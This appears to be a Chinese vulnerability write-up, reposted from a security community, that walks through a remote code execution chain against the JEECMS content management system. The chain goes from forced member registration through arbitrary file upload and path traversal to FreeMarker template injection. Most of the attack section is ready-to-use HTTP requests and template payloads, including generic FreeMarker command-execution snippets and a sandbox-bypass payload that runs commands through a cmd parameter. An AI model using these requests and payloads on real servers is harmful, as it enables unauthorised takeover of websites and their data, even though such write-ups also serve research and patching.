> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/oXIUMQwn9913Rp8LWZcxcQ)

**本文首发于****奇安信攻防社区**  

**社区有奖征稿**

· 基础稿费、额外激励、推荐作者、连载均有奖励，年度投稿 top3 还有神秘大奖！

· 将稿件提交至奇安信攻防社区（点击底部 阅读原文 ，加入社区）

[点击链接了解征稿详情](https://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489051&idx=1&sn=0f4d1ba03debd5bbe4d7da69bc78f4f8&scene=21#wechat_redirect)

### **0x01 前言**

CMS 对用户输入校验不严，攻击者可以配合前台任意文件上传和服务端模板注入执行任意代码，从而控制服务器权限。

### **0x02 任意注册**

首先需要先登录会员。如果站点正常开放会员注册的话，直接注册即可。

但对于一种更严格的情况，就是当站点关闭会员注册时，需要通过别的手段来登录。这里可以利用第三方登录的功能，通过 / thirdParty/bind 接口可以实现注册并且能够直接登录（该接口在关闭第三方登录时仍旧有效）。

```
POST /thirdParty/bind HTTP/1.1
Host: 192.168.17.128
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0) Gecko/20100101 Firefox/84.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Redirect-Header: false
X-Requested-With: XMLHttpRequest
Content-Length: 80
{"username":"user123456","loginWay": 1, "loginType": "QQ", "thirdId": "abcdefg"}
```

username 和 thirdId 参数可以随意设置，请求成功后就可以获得登录凭证（JSESSIONID 或 JEECMS-Auth-Token）

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31V3eeE5TreENs9LqnKeehUtNkbClVDgGictRLWplU5YgliamrbAibnqTLIQ/640?wx_fmt=png)

### **0x03 任意文件上传**

/member/upload/o_upload 接口允许会员向服务器上传文件，系统主要通过 UploadService.doUpload() 实现上传功能，但它没有对后缀名进行有效检查，所以攻击者可以上传任意后缀的文件，上传路径会回显在结果中（目录为 / u/cms/www/，文件名随机，后缀用户可控）。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31V2GnJIwCnF8x3BCv0Ln18hWe2RswF2cXZwUfagETrs4icaVFTFRS3edQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31Vp5AtagJzbhb8WSx18JeDX0z6Chroqjicn9ByG28HIPHfIHd0gMteruw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31VznCFZnPeRiajADsZ0ASdkuyicRVvPbYxJZeDN6So6WkhWtZZrWrMlicyQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31Vp5AtagJzbhb8WSx18JeDX0z6Chroqjicn9ByG28HIPHfIHd0gMteruw/640?wx_fmt=png)

根据接口直接上传

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31Vcxd1Ut1G3tK5H729ViaJD4Nlx7Dt89vF9tWpMhYvsBQ3DKrfRrMUZNA/640?wx_fmt=png)

测试发现，上传 jsp 文件是不能被解析的，而且由于目录固定，也不能向类加载路径上传 jar 文件，要想执行代码的话，得进一步借助 FreeMarker 模板。

### **0x04 模板注入**

FrontCommonController 会根据请求 /{page}.htm 的 page 参数，生成模板文件的路径。FrontUtils.getTplAbsolutePath() 会将 page 参数中的 “-” 替换成 “/”，FrontUtils.frontPageData() 进一步在结果的前部拼接上模板目录（/WEB-INF/t/cms/www/default）、在后部拼接上后缀（.html）。我们可以构造适当的 page 参数，使得能访问到上传的模板文件，比如 /..-..-..-..-..-u-cms-www-20210X-121948454xbn.htm 对应到文件 / u/cms/www/20210X/12194845

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31Vx9kFx9IRemmT5Zvu9m3yiaxotPKQulTyyzDkD1FnCZbhS92xL9Yqheg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31V4lzRlXdUf9QUpVdulXmJCkicFXRNaUjxiaP539nrtBcQDwcyUh6JS5qw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31VDLLt819Aia7CdMWT5xJCOfiazvW61AQx0Y4SekOkVCjB6E6OvXws8oLA/640?wx_fmt=png)

接下来的关键是如何利用 FreeMarker 执行代码。

FreeMarker 提供了很多内建函数，使得模板开发更加灵活，但也增加了危险性。

new 内建函数用于实例化实现了 TemplateModel 接口的类，FreeMarker 自带了几个符合要求的类，可以用于执行代码，用法如下：

```
<#assign value="freemarker.template.utility.Execute"?new()>${value("calc.exe")}
<#assign value="freemarker.template.utility.ObjectConstructor"?new()>${value("java.lang.ProcessBuilder","calc.exe").start()}
<#assign value="freemarker.template.utility.JythonRuntime"?new()><@value>import os;os.system("calc.exe")</@value>
```

但是，FreeMarker 也提供了相应措施来限制这些类的使用，通过 Configuration.setNewBuiltinClassResolver(TemplateClassResolver) 可以限制 new 内建函数对类的访问。官方提供了三个预定义的解析器：

UNRESTRICTED_RESOLVER：简单地调用 ClassUtil.forName(String)。

SAFER_RESOLVER：和第一个类似，但禁止解析 ObjectConstructor，Execute 和 freemarker.template.utility.JythonRuntime。

ALLOWS_NOTHING_RESOLVER：禁止解析任何类。

JEECMS 使用了 SAFER_RESOLVER 解析器，导致上述的几个类失效。

api 内建函数也常用于模板注入，通常利用它来获取类的 classLoader，以此来加载恶意类：

```
<#assign classLoader=Object?api.class.getClassLoader()>
${classLoader.loadClass("our.desired.class")}
```

但是 api 内建函数必须在配置项 api_builtin_enabled 为 true 时才有效，而该配置在 2.3.22 版本之后默认为 false，JEECMS 也没有手动去开启它。

new、api 两个常用的内建函数都失效了，这里就得利用到数据模型所暴露的对象了。这些暴露出的对象可以在模板中访问，可以通过它拿到 classLoader。

注意 FrontCommonController.java 第 80 行，调用了 FrontUtils.frontData()，用于向数据模型添加对象，FrontUtils.frontData() 的第 250 行添加了一个 CmsSite 对象，它就是一个合适的目标。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31VUZqd75lQUhBw3wFoNyaiaa0JjVbL440yb4IA5GXrpFhp4Grm0LPl6qw/640?wx_fmt=png)

由于 FreeMarker 内置了一份危险方法名单 unsafeMethods.properties，禁用了很多可用的方法，下面列举了部分：

```
java.lang.Class.getClassLoader()
java.lang.Class.newInstance()
java.lang.Class.forName(java.lang.String)
java.lang.Class.forName(java.lang.String,boolean,java.lang.ClassLoader)
java.lang.reflect.Constructor.newInstance([Ljava.lang.Object;)
java.lang.reflect.Method.invoke(java.lang.Object,[Ljava.lang.Object;)
```

很多获取 classLoader 的途径被封禁，这导致我们不能直接通过 site.getClass().getClassLoader() 拿到类加载器，但我们可以利用 site.getClass().getProtectionDomain().getClassLoader()，因为 ProtectionDomain.getClassLoader() 不在黑名单中。

Constructor.newInstance 被禁使得我们不能直接实例化对象，Method.invoke 被禁使得我们不能直接调用方法。这里要做的是寻找一个类的静态成员对象（public static final），然后执行它的静态方法。

FreeMarker 自带的 ObjectWrapper 类就是一个不错的选择，它的 DEFAULT_WRAPPER 字段是一个实例化后的 ObjectWrapper 对象，而 ObjectWrapper 的 newInstance 方法（继承自 BeansWrapper）可以用于实例化一个类，我们只需要向它传入被禁用的 freemarker.template.utility.Execute 进行实例化，返回的对象就可以直接用于执行系统命令。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31VCuYYZVd18Mvad5AjUMWu40iasQwwRNZr5WLlzhALF2Tnj1g1YohvFmw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31Vp6rIicyP5M6tk1m06EjRY9fyvgPibvBLCiaPkSPEP3Z9F4cRuCFCb1YBg/640?wx_fmt=png)

完整的模板可以这样写，通过控制 http 请求的 cmd 参数就可以执行任意命令：

```
${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
```

### **0x05 配合利用 - RCE**

结合文件上传, 上传成功后，访问相应 URL 执行系统命令：

```
POST /member/upload/o_upload HTTP/1.1
Host: 192.168.17.128
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:84.0)  Firefox/84.0
Accept: text/html,application/xhtml+XML,application/XML;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
JEECMS-Auth-Token: eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJ1c2VyMTIzNDU2IiwiY3JlYXRlZCI6MTYxMDQ0MDA5NzA4NywidXNlclNvdXJjZSI6ImFkbWluIiwiZXhwIjoxNjExMzA0MDk3fQ.12x-PtfuHIIC3aF7vV7kocd6KRwZr72SVUxbm74FdjD2WHKZ9IZm1n0cVMZdVgoFuzLuF4a8DKqmFhYX07mc5g
Content-Type: multipart/form-data; boundary=---------------------------1250178961143214655620108952
Content-Length: 604
Connection: close
Upgrade-Insecure-Requests: 1
-----------------------------1250178961143214655620108952
Content-Disposition: form-data; 
Content-Type: text/html
${site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.ObjectWrapper").getField("DEFAULT_WRAPPER").get(null).newInstance(site.getClass().getProtectionDomain().getClassLoader().loadClass("freemarker.template.utility.Execute"), null)(cmd)}
-----------------------------1250178961143214655620108952
Content-Disposition: form-data; 
File
-----------------------------1250178961143214655620108952--
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31VBR3snPtUia7nAdrxIaMAcxHvgibCtiaVlicuQ6p0YPzvmgIVPlNOxVJl8g/640?wx_fmt=png)

END

  

【版权说明】本作品著作权归带头大哥所有，授权补天漏洞响应平台独家享有信息网络传播权，任何第三方未经授权，不得转载。

  

  

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/WdbaA7b2IE4HTLHLvZ0oAuHqsibiaibC31VrB0mlJM9ichSTphBksuotgPfzAJclZN2fFodrhrZzNayecIopx8zNCg/640?wx_fmt=jpeg)

**带头大哥**

  

一个神秘且优秀的补天白帽子

**敲黑****板！转发≠学会，课代表给你们划重点了**

**复习列表**

  

  

  

  

  

[特斯拉 TBONE 漏洞分析](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247490085&idx=1&sn=2a9d747c2fe5de3f04aecfb3d8583a35&chksm=eafa5269dd8ddb7f8196c3677df6056c0b71082cef769b9b56c9e0e462a06924d24a201f38a0&scene=21#wechat_redirect)[](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489568&idx=1&sn=56beddb5ef58d9556d75bbd8dd146dd2&chksm=eafa506cdd8dd97a9420b312770c8ea1bdeb0394ce38ef54834e60e91c0b404f934ac494ca3c&scene=21#wechat_redirect)

  

[关于影响超 600W 设备的通用型路由循环漏洞分析](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489890&idx=1&sn=fcf3b50d242f2363c937094ca284a32f&chksm=eafa512edd8dd83856478b212ea35f84071e3d931aee6fdf75324139daea83a42983189e936e&scene=21#wechat_redirect)

  

[某邮件系统后台管理员任意登录分析](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247490009&idx=1&sn=ea120cc287ad0735237a831a7b4847cb&chksm=eafa5195dd8dd8837c3d39040368110d77d2b30f0251fa2f7e4d5e656779249b1d30fce329a0&scene=21#wechat_redirect)

  

[代码审计之 eyouCMS 最新版 getshell 漏洞](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489781&idx=1&sn=a2d0ccd466dfa95067f223c8318a316d&chksm=eafa50b9dd8dd9af45ef4fcf23074aeecc196dc72b3ff447282a9e6ea9904dcc08fe72430d30&scene=21#wechat_redirect)

  

[某行业通用流程管控平台 RCE 之旅](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489976&idx=1&sn=a7b450efb495ab424f77d06fe4c2d1ad&chksm=eafa51f4dd8dd8e21cf2a3311161db98c8d5a53951e7d548f62112b49712e978501f0cc5a699&scene=21#wechat_redirect)

  

[某开源 ERP 最新版 SQL 与 RCE 的审计过程](http://mp.weixin.qq.com/s?__biz=MzI2NzY5MDI3NQ==&mid=2247489992&idx=1&sn=6a510d12d06ccf4a365f41b386a3e197&chksm=eafa5184dd8dd892fd3e9c8779571939b6dc6465cf86ac8e1d094b3994302500c394fb12ecfe&scene=21#wechat_redirect)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/WdbaA7b2IE6D8InhXuGX2q6Cbw7zhMJLFcmlcnz38EApnEkFiaISicklcwbo3gnI17t54PqyYOE8LV4yczIfjdqw/640?wx_fmt=png)  

  

分享、点赞、在看，一键三连，yyds。

![](https://mmbiz.qpic.cn/mmbiz_gif/FIBZec7ucChYUNicUaqntiamEgZ1ZJYzLRasq5S6zvgt10NKsVZhejol3iakHl3ItlFWYc8ZAkDa2lzDc5SHxmqjw/640?wx_fmt=gif)

  

点击阅读原文，加入社区，获取更多技术干货！